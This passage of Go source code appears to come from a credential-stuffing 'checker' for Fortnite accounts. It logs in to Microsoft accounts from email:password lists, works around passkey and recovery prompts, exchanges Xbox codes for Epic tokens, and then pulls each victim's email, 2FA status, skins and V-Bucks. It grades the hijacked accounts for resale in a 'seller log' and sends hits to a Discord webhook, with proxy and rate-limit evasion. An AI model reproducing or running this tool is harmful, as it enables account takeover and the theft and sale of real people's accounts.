        sellerLogEntry := fmt.Sprintf("%s | Epic Email: %s | OG Skins: %s | Skin Count: %d | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
            acc, epicEmail, strings.Join(ogSkinsFound, ", "), skinCount, totalVbucks, alternateMethodsStr, hasStw, lastPlayed)
        s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, sellerLogEntry)
        AddToRares(1)
        isExclusive = true
    } else if len(rareSkinsFound) > 0 {
        exclusiveReason := "Exclusive Skins"
        s.ExportExclusive(acc, displayName, strings.Join(rareSkinsFound, ", "), exclusiveReason, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, skinCount, hasStw)
        sellerLogEntry := fmt.Sprintf("Epic Email: %s | Exclusive Skins: %s | Skin Count: %d | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
            epicEmail, strings.Join(rareSkinsFound, ", "), skinCount, totalVbucks, alternateMethodsStr, hasStw, lastPlayed)
        s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, acc+" | "+sellerLogEntry)
        AddToRares(1)
        isExclusive = true
    } else if totalVbucks > 3000 {
        vbucksMsg := fmt.Sprintf("3K+ V-Bucks: %d", totalVbucks)
        s.ExportExclusive(acc, displayName, skinsList, vbucksMsg, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, skinCount, hasStw)
        isExclusive = true
    } else if totalVbucks > 1000 {
        vbucksMsg := fmt.Sprintf("1K+ V-Bucks: %d", totalVbucks)
        s.ExportExclusive(acc, displayName, skinsList, vbucksMsg, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, skinCount, hasStw)
        isExclusive = true
    }
    if !isExclusive {
        if SendAllHits && DiscordWebhookURL != "" {
            sendDiscordWebhookForHit(acc, displayName, fmt.Sprintf("%d Skins", skinCount), epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw, twofaStatus)
        }
        if isHeadless && skinCount >= 2 {
            s.ExportHeadless(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, skinCount, totalVbucks, hasStw)
        }
    }
}
func calculateAccountQuality(skinCount, vbucks int, hasStw, hasOg, hasRare bool, twofaStatus string) int {
    score := 0
    switch {
    case skinCount >= 300:
        score += 25
    case skinCount >= 100:
        score += 20
    case skinCount >= 50:
        score += 15
    case skinCount >= 10:
        score += 10
    case skinCount >= 5:
        score += 5
    }
    switch {
    case vbucks >= 100000:
        score += 25
    case vbucks >= 50000:
        score += 20
    case vbucks >= 25000:
        score += 15
    case vbucks >= 10000:
        score += 10
    case vbucks >= 5000:
        score += 5
    }
    if hasStw {
        score += 10
    }
    if twofaStatus == "true" {
        score += 10
    }
    rareValue := 0
    if hasOg {
        rareValue += 20
    }
    if hasRare {
        rareValue += 10
    }
    score += rareValue
    return score
}
func IntToString(i int) string {
    return strconv.Itoa(i)
}
type EpicGames struct {
    client *http.Client
}
func CheckAccount(acc string) bool {
    AddToCpm(1)
    jar, err2 := cookiejar.New(nil)
    if err2 != nil {
        LogError(fmt.Sprintf("Failed to create cookie jar for %s: %v", acc, err2))
        GetStats().ExportRetries(acc, "failed to create cookie jar", true)
        return false
    }
    session := &http.Client{Jar: jar}
    var proxy string
    if UseProxies && len(Proxies) > 0 {
        proxy = Proxies[0]
    }
    creds := strings.SplitN(acc, ":", 2)
    if len(creds) != 2 {
        LogError(fmt.Sprintf("Invalid credentials format for %s", acc))
        GetStats().ExportBads(acc, "Invalid credentials format")
        return false
    }
    email, password := creds[0], creds[1]
    GetStats().getSessionFolder()
    var authResp *http.Response
    var authBody string
    authURL := "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"
    authHeaders := map[string]string{
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "accept-encoding": "gzip, deflate, br",
        "accept": "*/*",
        "connection": "keep-alive",
        "accept-language": "en,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": cookieValue,
        "host": "login.live.com",
        "origin": "https://login.live.com",
        "referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
    }
    maxAuthAttempts := 5
    for attempt := 1; attempt <= maxAuthAttempts; attempt++ {
        data := url.Values{}
        data.Set("i13", "0")
        data.Set("login", email)
        data.Set("loginfmt", email)
        data.Set("type", "11")
        data.Set("LoginOptions", "3")
        data.Set("lrt", "")
        data.Set("lrtPartition", "")
        data.Set("hisRegion", "")
        data.Set("hisScaleUnit", "")
        data.Set("passwd", password)
        data.Set("ps", "2")
        data.Set("psRNGCDefaultType", "1")
        data.Set("psRNGCEntropy", "")
        data.Set("psRNGCSLK", psRNGCSLKValue)
        data.Set("canary", "")
        data.Set("ctx", "")
        data.Set("hpgrequestid", "")
        data.Set("PPFT", ppftValue)
        data.Set("PPSX", "Passp")
        data.Set("NewUser", "1")
        data.Set("FoundMSAs", "")
        data.Set("fspost", "0")
        data.Set("i21", "0")
        data.Set("CookieDisclosure", "0")
        data.Set("IsFidoSupported", "1")
        data.Set("isSignupPost", "0")
        data.Set("isRecoveryAttemptPost", "0")
        data.Set("i19", "21648")
        req, _ := http.NewRequest("POST", authURL, strings.NewReader(data.Encode()))
        for key, value := range authHeaders {
            req.Header.Set(key, value)
        }
        authResp, err2 = session.Do(req)
        if err2 != nil {
            LogError(fmt.Sprintf("Error during authentication for %s: %v", acc, err2))
            time.Sleep(time.Duration(attempt) * time.Second)
            continue
        }
        authBody, err2 = readResponseBody(authResp)
        if err2 != nil {
            authResp.Body.Close()
            GetStats().ExportRetries(acc, "failed to read auth response", true)
            return false
        }
        lowerAuthBody := strings.ToLower(authBody)
        if authResp.StatusCode == 429 || strings.Contains(lowerAuthBody, "retry with a different device") {
            authResp.Body.Close()
            if attempt == maxAuthAttempts {
                GetStats().ExportRetries(acc, "rate limited during authentication", false)
                return false
            }
            time.Sleep(time.Duration(attempt*2) * time.Second)
            continue
        }
        if authResp.StatusCode != 200 {
            authResp.Body.Close()
            if authResp.StatusCode >= 500 {
                if attempt < maxAuthAttempts {
                    time.Sleep(time.Duration(attempt) * time.Second)
                    continue
                }
                GetStats().ExportRetries(acc, fmt.Sprintf("auth HTTP %d", authResp.StatusCode), false)
                return false
            }
            GetStats().ExportBads(acc, fmt.Sprintf("HTTP %d", authResp.StatusCode))
            return false
        }
        break
    }
    if authResp == nil || authBody == "" {
        GetStats().ExportRetries(acc, "empty auth response", true)
        return false
    }
    defer authResp.Body.Close()
    debugLog("Microsoft authentication response for %s: %s", acc, authBody)
    if strings.Contains(strings.ToLower(authBody), "abuse?mkt=") || strings.Contains(strings.ToLower(authBody), "recover?mkt=") {
        LogError(fmt.Sprintf("Account %s got abuse/recover response in Microsoft auth, marking as bad", acc))
        GetStats().ExportBads(acc, "abuse/recover response in Microsoft auth")
        return false
    } else if strings.Contains(strings.ToLower(authBody), "cancel?mkt=") || strings.Contains(strings.ToLower(authBody), "passkey?mkt=") {
        formURL := Parse(authBody, `action="`, `"`)
        if formURL != "" {
            var ruURL string
            if strings.Contains(formURL, "ru=") {
                ruStart := strings.Index(formURL, "ru=")
                ruValueStart := ruStart + 3
                ruValueEnd := len(formURL)
                if ampIdx := strings.Index(formURL[ruValueStart:], "&"); ampIdx != -1 {
                    ruValueEnd = ruValueStart + ampIdx
                }
                ruURL = formURL[ruValueStart:ruValueEnd]
                decodedRU, err2 := url.QueryUnescape(ruURL)
                if err2 != nil {
                    decodedRU = ruURL
                }
                finalRU := decodedRU + "&res=success"
                resp2, err2 := session.Get(finalRU)
                if err2 != nil {
                    // fmt.Println("Error on cancel/passkey GET:", err2)
                } else {
                    defer resp2.Body.Close()
                    responseBody, err2 := readResponseBody(resp2)
                    if err2 != nil {
                        // fmt.Println("Error reading cancel/passkey response:", err2)
                        responseBody = ""
                    }
                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
                        return false
                    }
                    // fmt.Println("Response from cancel/passkey GET:", responseBody)
                    logResponseToFile(acc, "cancel?mkt_GET", responseBody)
                }
            } else {
                decodedFormURL, err2 := url.QueryUnescape(formURL)
                if err2 != nil {
                    decodedFormURL = formURL
                }
                resp2, err2 := session.Get(decodedFormURL)
                if err2 != nil {
                    fmt.Println("Error on cancel/passkey POST:", err2)
                } else {
                    defer resp2.Body.Close()
                    responseBody, err2 := readResponseBody(resp2)
                    if err2 != nil {
                        fmt.Println("Error reading cancel/passkey response:", err2)
                        responseBody = ""
                    }
                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey POST, marking as bad", acc))
                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey POST")
                        return false
                    }
                    fmt.Println("Response from cancel/passkey POST:", responseBody)
                    logResponseToFile(acc, "cancel?mkt_POST", responseBody)
                }
            }
        }
    }
    for _, keyword := range FailureKeywords {
        if strings.Contains(strings.ToLower(authBody), strings.ToLower(keyword)) {
            GetStats().ExportBads(acc, keyword)
            return false
        }
    }
    if strings.Contains(strings.ToLower(authBody), "cancel?mkt=") || strings.Contains(strings.ToLower(authBody), "passkey?mkt=") {
        formURL := Parse(authBody, `action="`, `"`)
        if formURL != "" {
            var ruURL string
            if strings.Contains(formURL, "ru=") {
                ruStart := strings.Index(formURL, "ru=")
                ruValueStart := ruStart + 3
                ruValueEnd := len(formURL)
                if ampIdx := strings.Index(formURL[ruValueStart:], "&"); ampIdx != -1 {
                    ruValueEnd = ruValueStart + ampIdx
                }
                ruURL = formURL[ruValueStart:ruValueEnd]
                decodedRU, err2 := url.QueryUnescape(ruURL)
                if err2 != nil {
                    decodedRU = ruURL
                }
                finalRU := decodedRU + "&res=success"
                resp2, err2 := session.Get(finalRU)
                if err2 != nil {
                    // fmt.Println("Error on cancel/passkey GET:", err2)
                } else {
                    defer resp2.Body.Close()
                    responseBody, err2 := readResponseBody(resp2)
                    if err2 != nil {
                        // fmt.Println("Error reading cancel/passkey response:", err2)
                        responseBody = ""
                    }
                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
                        return false
                    }
                    // fmt.Println("Response from cancel/passkey GET:", responseBody)
                    logResponseToFile(acc, "cancel?mkt_GET", responseBody)
                }
            } else {
                decodedFormURL, err2 := url.QueryUnescape(formURL)
                if err2 != nil {
                    decodedFormURL = formURL
                }
                resp2, err2 := session.Get(decodedFormURL)
                if err2 != nil {
                    // fmt.Println("Error on cancel/passkey GET:", err2)
                } else {
                    defer resp2.Body.Close()
                    responseBody, err2 := readResponseBody(resp2)
                    if err2 != nil {
                        // fmt.Println("Error reading cancel/passkey response:", err2)
                        responseBody = ""
                    }
                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
                        return false
                    }
                    // fmt.Println("Response from cancel/passkey GET:", responseBody)
                    logResponseToFile(acc, "cancel?mkt_GET", responseBody)
                }
            }
        }
    }
    if authResp == nil || authResp.StatusCode != 200 {
        LogError(fmt.Sprintf("Microsoft authentication failed for %s - no valid response", acc))
        GetStats().ExportBads(acc, "Microsoft authentication failed")
        return false
    }
    AddToMsHits(1)
    transport := &http.Transport{
        DisableCompression: false,
    }
    if proxy != "" {
        proxyURL, err2 := url.Parse(proxy)
        if err2 == nil {
            transport.Proxy = http.ProxyURL(proxyURL)
        }
    }
    epicGamesClient := &http.Client{
        Transport: transport,
        Jar: jar,
        Timeout: 30 * time.Second,
    }
    epicGames := &EpicGames{
        client: epicGamesClient,
    }
    var xboxToken string
    maxXboxRetries := 3
    for attempt := 0; attempt < maxXboxRetries; attempt++ {
        xboxAuthURL := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
        epicGames.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        }
        defer func() { epicGames.client.CheckRedirect = nil }()
        resp22, err22 := epicGames.client.Get(xboxAuthURL)
        if err22 != nil {
            if resp22 == nil {
                LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err22))
                GetStats().ExportBads(acc, "Failed to get Xbox token - initial GET failed")
                return false
            }
        }
        defer resp22.Body.Close()
        location, err2 := resp22.Location()
        if err2 != nil {
            body, err2Read := readResponseBody(resp22)
            if err2Read != nil {
                LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2Read))
                GetStats().ExportBads(acc, "Failed to get Xbox token - error reading response body")
                return false
            }
            if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
                LogError(fmt.Sprintf("Account %s got abuse/recover response, marking as bad", acc))
                GetStats().ExportBads(acc, "abuse/recover response")
                return false
            } else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
                if ru := Parse(body, "ru=", "\""); ru != "" {
                    unquotedRU, _ := url.QueryUnescape(ru)
                    resp22, err2 = epicGames.client.Get(unquotedRU)
                    if err2 != nil && resp22 == nil {
                        LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
                        GetStats().ExportBads(acc, "Failed to get Xbox token - ru GET request failed")
                        return false
                    }
                    defer resp22.Body.Close()
                    location, err2 = resp22.Location()
                    if err2 != nil {
                        LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
                        GetStats().ExportBads(acc, "Failed to get Xbox token - no location from ru redirect")
                        return false
                    }
                }
            } else {
                LogError(fmt.Sprintf("Failed to get Xbox token for %s: no location and no cancel/passkey in body", acc))
                GetStats().ExportBads(acc, "Failed to get Xbox token - no location or cancel/passkey")
                return false
            }
        }
        if location == nil {
            LogError(fmt.Sprintf("Failed to get Xbox token for %s: location was nil", acc))
            GetStats().ExportBads(acc, "Failed to get Xbox token - location was nil")
            return false
        }
        xboxToken = location.Query().Get("code")
        if xboxToken == "" {
            LogError(fmt.Sprintf("Failed to get Xbox token for %s: token not found in redirect", acc))
            GetStats().ExportBads(acc, "Failed to get Xbox token - token not found in redirect")
            return false
        }
        break
    }
    transport = &http.Transport{
        DisableCompression: false,
    }
    if proxy != "" {
        proxyURL, err2 := url.Parse(proxy)
        if err2 == nil {
            transport.Proxy = http.ProxyURL(proxyURL)
        }
    }
    epicGamesRetryClient := &http.Client{
        Transport: transport,
        Jar: jar,
        Timeout: 30 * time.Second,
    }
    epicGamesRetry := &EpicGames{
        client: epicGamesRetryClient,
    }
    var xboxAuthURL string = "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
    var location *url.URL
    var resp22 *http.Response
    epicGamesRetry.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
        return http.ErrUseLastResponse
    }
    defer func() { epicGamesRetry.client.CheckRedirect = nil }()
    var resp2 *http.Response
    resp2, err2 = epicGamesRetry.client.Get(xboxAuthURL)
    if err2 != nil {
        if resp2 == nil {
            LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
            GetStats().ExportBads(acc, "Failed to get Xbox token for retry")
            return false
        }
    }
    defer resp2.Body.Close()
    location, err2 = resp2.Location()
    if err2 != nil {
        var body string
        var err2Read error
        body, err2Read = readResponseBody(resp2)
        if err2Read != nil {
            LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2Read))
            GetStats().ExportBads(acc, "Failed to get Xbox token for retry - error reading response body")
            return false
        }
        if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
            LogError(fmt.Sprintf("Account %s got abuse/recover response on retry, marking as bad", acc))
            GetStats().ExportBads(acc, "abuse/recover response on retry")
            return false
        } else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
            if ru := Parse(body, "ru=", "\""); ru != "" {
                unquotedRU, _ := url.QueryUnescape(ru)
                resp2, err2 = epicGamesRetry.client.Get(unquotedRU)
                if err2 != nil && resp2 == nil {
                    LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
                    GetStats().ExportBads(acc, "Failed to get Xbox token for retry - ru GET request failed")
                    return false
                }
                defer resp22.Body.Close()
                location, err2 = resp22.Location()
                if err2 != nil {
                    LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
                    GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location from ru redirect")
                    return false
                }
            }
        } else {
            LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: no location and no cancel/passkey in body", acc))
            GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location or cancel/passkey")
            return false
        }
    }
    if location == nil {
        LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: location was nil", acc))
        GetStats().ExportBads(acc, "Failed to get Xbox token for retry - location was nil")
        return false
    }
    xboxToken = location.Query().Get("code")
    if xboxToken == "" {
        LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: token not found in redirect", acc))
        GetStats().ExportBads(acc, "Failed to get Xbox token for retry - token not found in redirect")
        return false
    }
    data := url.Values{}
    data.Set("grant_type", "external_auth")
    data.Set("external_auth_type", "xbl")
    data.Set("external_auth_token", xboxToken)
    req, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(data.Encode()))
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=")
    req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
    for i := 0; i < 3; i++ {
        resp2, err2 = http.DefaultClient.Do(req)
        if err2 == nil {
            break
        }
        time.Sleep(5 * time.Second)
    }
    if err2 != nil {
        LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
        GetStats().ExportRetries(acc, err2.Error(), true)
        return false
    }
    defer resp2.Body.Close()
    var body string
    body, err2 = readResponseBody(resp2)
    if err2 != nil {
        LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
        GetStats().ExportRetries(acc, err2.Error(), true)
        return false
    }
    bodyStr := body
    debugLog("Xbox token exchange response: %s", bodyStr)
    var accountID, displayName, accessToken string
    if strings.Contains(bodyStr, "errors.com.epicgames.account.identity_provider.api_error") {
        accountID = "retry"
        displayName = "retry"
        accessToken = "retry"
    } else if strings.Contains(bodyStr, "errors.com.epicgames.account.ext_auth.invalid_external_auth_token") {
        accountID = "invalid"
        displayName = "invalid"
        accessToken = "invalid"
    } else if strings.Contains(bodyStr, "errors.com.epicgames.account.account_not_active") || strings.Contains(bodyStr, "sorry the account you are using is not active") {
        accountID = "inactive"
        displayName = "inactive"
        accessToken = "inactive"
    } else if strings.Contains(bodyStr, "correctiveAction\":\"DATE_OF_BIRTH") || strings.Contains(bodyStr, "account_review_details_required") {
        accountID = "headless"
        displayName = "headless"
        accessToken = "headless"
        CurrentAccountHeadless = true
    } else {
        var result map[string]interface{}
        if err2 := json.Unmarshal([]byte(bodyStr), &result); err2 != nil {
            LogError(fmt.Sprintf("Failed to parse Xbox exchange response for %s: %v", acc, err2))
            GetStats().ExportRetries(acc, "Failed to parse Xbox exchange response", true)
            return false
        }
        if accountIDVal, ok := result["account_id"]; ok && accountIDVal != nil {
            accountID, _ = accountIDVal.(string)
        } else {
            accountID = ""
        }
        if displayNameVal, ok := result["displayName"]; ok && displayNameVal != nil {
            displayName, _ = displayNameVal.(string)
        } else {
            displayName = ""
        }
        if accessTokenVal, ok := result["access_token"]; ok && accessTokenVal != nil {
            accessToken, _ = accessTokenVal.(string)
        } else {
            accessToken = ""
        }
    }
    if err2 != nil {
        LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
        GetStats().ExportRetries(acc, err2.Error(), true)
        return false
    }
    if accountID == "retry" {
        LogError(fmt.Sprintf("Retrying account %s due to identity provider error", acc))
        GetStats().ExportRetries(acc, "identity provider error", false)
        return false
    }
    if accountID == "invalid" {
        LogError(fmt.Sprintf("Account %s has invalid external auth token", acc))
        GetStats().ExportBads(acc, "Invalid external auth token")
        return false
    }
    if accountID == "inactive" {
        LogError(fmt.Sprintf("Account %s is inactive", acc))
        GetStats().ExportBads(acc, "Inactive account")
        return false
    }
    if accountID == "headless" {
        AddToHeadless(1)
        CurrentAccountHeadless = true
        GetStats().ExportHeadless(acc, "Requires DOB", "none", "none", "N/A", 0, 0, false)
        return true
    }
    if accessToken == "" {
        LogError(fmt.Sprintf("Received empty access token for %s", acc))
        GetStats().ExportRetries(acc, "empty access token", true)
        return false
    }
    var accountData map[string]interface{}
    results := make(map[string]interface{})
    var wg sync.WaitGroup
    var mu sync.Mutex
    client := &http.Client{Timeout: 10 * time.Second}
    fetch := func(url, method string, headers map[string]string, key string) {
        defer wg.Done()
        var req *http.Request
        var err2 error
        if method == "POST" {
            req, err2 = http.NewRequest("POST", url, strings.NewReader("{}"))
        } else {
            req, err2 = http.NewRequest("GET", url, nil)
        }
        if err2 != nil {
            return
        }
        for h, v := range headers {
            req.Header.Set(h, v)
        }
        resp2, err2 := client.Do(req)
        if err2 != nil {
            return
        }
        defer resp2.Body.Close()
        body, err2 := readResponseBody(resp2)
        if err2 != nil {
            return
        }
        mu.Lock()
        results[key] = []byte(body)
        mu.Unlock()
    }
    wg.Add(6)
    go fetch("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/"+accountID, "GET", map[string]string{"Authorization": "Bearer " + accessToken}, "account")
    go fetch("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/"+accountID+"/client/QueryProfile?profileId=athena&rvn=-1", "POST", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "fortnite")
    go fetch("https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/"+accountID, "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "stats")
    go fetch("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/"+accountID+"/client/QueryProfile?profileId=common_core&rvn=-1", "POST", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "vbucks")
    go fetch("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/"+accountID+"/entitlements", "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "stw")
    go fetch("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/"+accountID+"/externalAuths", "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "linked")
    wg.Wait()
    processedResults := make(map[string]interface{})
    debugLog("Processing account data results for account: %s", accountID)
    var epicEmail string = "none"
    var tfaEnabled string = "unknown"
    var tfaMethod string = ""
    var emailVerified string = "unknown"
    var skinsList string = ""
    var rawSkinsList []string
    var skinCount int = 0
    var lastPlayed string = "N/A"
    var totalVbucks int = 0
    var hasStw bool = false
    var hasPsn bool = false
    var hasNintendo bool = false
    if accountData, ok := results["account"]; ok {
        var account map[string]interface{}
        json.Unmarshal(accountData.([]byte), &account)
        if email, ok := account["email"].(string); ok {
            epicEmail = email
        }
        if tfa, ok := account["tfaEnabled"].(bool); ok {
            tfaEnabled = strings.ToLower(fmt.Sprintf("%t", tfa))
        }
        if tfaMethodVal, ok := account["twoFactorMethod"]; ok && tfaMethodVal != nil {
            if method, ok := tfaMethodVal.(string); ok {
                tfaMethod = strings.ToLower(method)
            }
        } else if authMethod, ok := account["twoFactorAuthMethod"]; ok && authMethod != nil {
            if method, ok := authMethod.(string); ok {
                tfaMethod = strings.ToLower(method)
            }
        } else if mfaVal, ok := account["mfaMethod"]; ok && mfaVal != nil {
            if method, ok := mfaVal.(string); ok {
                tfaMethod = strings.ToLower(method)
            }
        } else if tfaProvider, ok := account["tfaProvider"]; ok && tfaProvider != nil {
            if method, ok := tfaProvider.(string); ok {
                tfaMethod = strings.ToLower(method)
            }
        } else if authType, ok := account["twoFactorAuthType"]; ok && authType != nil {
            if method, ok := authType.(string); ok {
                tfaMethod = strings.ToLower(method)
            }
        } else if authType2, ok := account["tfaType"]; ok && authType2 != nil {
            if method, ok := authType2.(string); ok {
                tfaMethod = strings.ToLower(method)
            }
        }
        if verified, ok := account["emailVerified"].(bool); ok {
            emailVerified = strings.ToLower(fmt.Sprintf("%t", verified))
        }
        if displayNameVal, ok := account["displayName"].(string); ok {
            displayName = displayNameVal
        }
    }
    processedResults["epic_email"] = epicEmail
    processedResults["tfa_enabled"] = tfaEnabled
    processedResults["email_verified"] = emailVerified
    processedResults["displayName"] = displayName
    if fortniteData, ok := results["fortnite"]; ok {
        fortniteText := string(fortniteData.([]byte))
        var fortniteJSON map[string]interface{}
        if json.Unmarshal([]byte(fortniteText), &fortniteJSON) == nil {
            if profileChanges, ok := fortniteJSON["profileChanges"].([]interface{}); ok && len(profileChanges) > 0 {
                if change, ok := profileChanges[0].(map[string]interface{}); ok {
                    if profile, ok := change["profile"].(map[string]interface{}); ok {
                        if items, ok := profile["items"].(map[string]interface{}); ok {
                            for _, item := range items {
                                if itemMap, ok := item.(map[string]interface{}); ok {
                                    if templateID, ok := itemMap["templateId"].(string); ok {
                                        if strings.HasPrefix(templateID, "AthenaCharacter:") {
                                            rawSkinsList = append(rawSkinsList, templateID)
                                        }
                                    }
                                }
                            }
                        }
                        if stats, ok := profile["stats"].(map[string]interface{}); ok {
                            if attributes, ok := stats["attributes"].(map[string]interface{}); ok {
                                if lastMatch, ok := attributes["last_match_end_datetime"].(string); ok {
                                    if strings.Contains(lastMatch, "T") {
                                        lastPlayed = strings.Split(lastMatch, "T")[0]
                                    } else {
                                        lastPlayed = lastMatch
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        uniqueSkins := make(map[string]bool)
        for _, skin := range rawSkinsList {
            uniqueSkins[skin] = true
        }
        skinCount = len(uniqueSkins)
        var mappedSkins []string
        for skin := range uniqueSkins {
            skinID := strings.ToLower(strings.TrimPrefix(skin, "AthenaCharacter:"))
            if name, ok := Mapping[skinID]; ok {
                mappedSkins = append(mappedSkins, name)
            } else {
                // Fallback for unmapped common skins
                if strings.Contains(skinID, "cid_defaultoutfit") {
                    mappedSkins = append(mappedSkins, "Default Outfit")
                } else {
                    mappedSkins = append(mappedSkins, strings.TrimPrefix(skin, "AthenaCharacter:"))
                }
            }
        }
        skinsList = strings.Join(mappedSkins, ", ")
    }
    processedResults["skins_list"] = skinsList
    processedResults["raw_skins_list"] = rawSkinsList
    processedResults["skin_count"] = skinCount
    processedResults["last_played"] = lastPlayed
    totalVbucks = 0
    if vbucksData, ok := results["vbucks"]; ok {
        var vbucksJSON map[string]interface{}
        if json.Unmarshal(vbucksData.([]byte), &vbucksJSON) == nil {
            if profileChanges, ok := vbucksJSON["profileChanges"].([]interface{}); ok {
                for _, change := range profileChanges {
                    if changeMap, ok := change.(map[string]interface{}); ok {
                        if profile, ok := changeMap["profile"].(map[string]interface{}); ok {
                            if items, ok := profile["items"].(map[string]interface{}); ok {
                                for _, item := range items {
                                    if itemMap, ok := item.(map[string]interface{}); ok {
                                        if templateID, ok := itemMap["templateId"].(string); ok {
                                            if strings.HasPrefix(templateID, "Currency:Mtx") {
                                                if quantity, ok := itemMap["quantity"].(float64); ok {
                                                    totalVbucks += int(quantity)
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    processedResults["total_vbucks"] = totalVbucks
    hasStw = false
    if stwData, ok := results["stw"]; ok {
        stwText := string(stwData.([]byte))
        hasStw = strings.Contains(stwText, "entitlementName\":\"Fortnite_Founder\"")
    }
